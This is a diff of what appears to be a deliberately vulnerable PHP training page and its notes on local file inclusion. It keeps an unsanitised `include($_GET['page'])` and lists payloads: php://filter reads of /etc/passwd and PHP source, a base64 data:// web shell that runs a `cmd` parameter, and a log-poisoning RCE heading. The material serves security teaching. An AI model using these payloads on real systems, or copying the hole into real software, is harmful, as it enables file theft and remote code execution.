@@ -10,10 +10,12 @@ include 'templates/header.php';
 <div class="container mt-4">                                                                                                                                                                                                                   
 <?php                                                                                                                                                                                                                                          
 ini_set('display_errors', true);       # UNSAFE        
-ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards)
-ini_set('allow_url_fopen', false);                     
-ini_set('allow_url_include', false);
-ini_set('allow_url_include', 'Off');
+ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards). If enabled, won't allow reads to anyhting not user-owned, DB creds should be in the file if it accesses any DB. Other functions can be disabled (readfile, basedir)
+# http://php.adamharvey.name/manual/en/ini.sect.safe-mode.php
+
+ini_set('allow_url_fopen', false);     # Disallows PHP opening URL files                
+ini_set('allow_url_include', false);   # Allows "include" statements to the PHP code. note: Can only be enabled if "allow_url_fopen" is true. https://www.php.net/manual/en/filesystem.configuration.php
+ini_set('allow_url_include', 'Off');   # ?
 
 if(isset($_GET['page'])){
         include($_GET['page']); # VULNERABLE (any payload injected will work)
@@ -33,11 +35,13 @@ include 'templates/header.php';
 ?>
 <div class="container mt-4">
 <?php
-ini_set('display_errors', true);
-ini_set('safe_mode', false);
-ini_set('allow_url_fopen', false);
-ini_set('allow_url_include', false);
-ini_set('allow_url_include', 'Off');
+ini_set('display_errors', true);       # UNSAFE        
+ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards). If enabled, won't allow reads to anyhting not user-owned, DB creds should be in the file if it accesses any DB. Other functions can be disabled (readfile, basedir)
+# http://php.adamharvey.name/manual/en/ini.sect.safe-mode.php
+
+ini_set('allow_url_fopen', false);     # Disallows PHP opening URL files                
+ini_set('allow_url_include', false);   # Allows "include" statements to the PHP code. note: Can only be enabled if "allow_url_fopen" is true. https://www.php.net/manual/en/filesystem.configuration.php
+ini_set('allow_url_include', 'Off');   # ?
 
 function containsStr($str, $subStr){
     return strpos($str, $subStr) !== false;
@@ -83,25 +87,12 @@ include 'templates/footer.php';
 PHP wrappers have the same general functionality as normal LFI, but they can bypass some filters.
 ```
 php://filter/string.rot13/resource=../../../../../etc/passwd
-php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd                              // Use to read PHP files (resource=index.php)
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt         // `cmd` argument inclusion, prints "Shell done!" if it works
 ```
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-For PHP RCE, you'll want to use a technique called `log poisoning`.
-
+### Log poisoning (RCE)
 ##### Required
 Access to files
 A log file (Usually `/var/log/apache2/access.log`), see #
